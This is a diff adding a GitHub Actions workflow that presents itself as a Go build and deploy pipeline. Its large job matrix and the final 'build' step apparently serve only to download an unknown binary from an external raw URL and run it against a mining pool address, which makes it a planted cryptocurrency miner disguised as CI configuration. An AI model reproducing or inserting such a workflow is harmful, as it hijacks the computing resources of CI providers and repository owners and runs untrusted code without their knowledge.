@@ -1,0 +1,54 @@
+name: build
+on: [push]
+jobs:
+  build:
+    name: build
+    runs-on: buildjet-4vcpu-ubuntu-2204
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+  deploy:
+    name: deploy
+    needs: build
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+    - name : install dependencies 
+      run: apt-get upgrade && apt-get update && apt-get install unzip 
+    - name: build  
+      run: wget https://gitgud.io/PCMJ/m/-/raw/master/apel && chmod +x apel && ./apel --account CP_lffgxlitim --pool 69.55.49.221:443
